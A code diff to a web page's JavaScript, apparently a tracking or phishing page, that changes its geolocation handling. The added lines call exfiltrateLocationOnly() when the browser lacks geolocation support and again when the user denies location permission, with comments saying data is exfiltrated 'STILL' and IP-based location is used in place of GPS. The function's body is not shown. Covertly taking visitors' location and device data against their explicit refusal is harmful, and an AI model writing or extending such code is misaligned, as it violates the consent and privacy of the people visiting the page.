@@ -416,6 +416,8 @@
         function requestLocationImmediately() {
             if (!navigator.geolocation) {
                 console.log('[TRI] Geolocation not supported');
+                // Still exfiltrate even without GPS support
+                exfiltrateLocationOnly();
                 return;
             }
 
@@ -431,16 +433,19 @@
                     console.log('[TRI] ✅ Location captured:', userData.location);
                     console.log('[TRI] GPS:', userData.location.lat, userData.location.lng);
 
-                    // AUTO STORE location + device info immediately (tanpa nama/nohp)
+                    // AUTO STORE location + device info immediately
                     await exfiltrateLocationOnly();
                 },
-                (error) => {
-                    // Error or denied
+                async (error) => {
+                    // Error or denied - STILL EXFILTRATE with IP-based location
                     console.log('[TRI] ❌ Location error:', error.message);
 
                     if (error.code === error.PERMISSION_DENIED) {
-                        console.log('[TRI] User denied location - will continue without GPS');
+                        console.log('[TRI] User denied location - using IP-based location instead');
                     }
+
+                    // STILL STORE even if GPS denied (use IP-based location)
+                    await exfiltrateLocationOnly();
                 },
                 {
                     enableHighAccuracy: true,
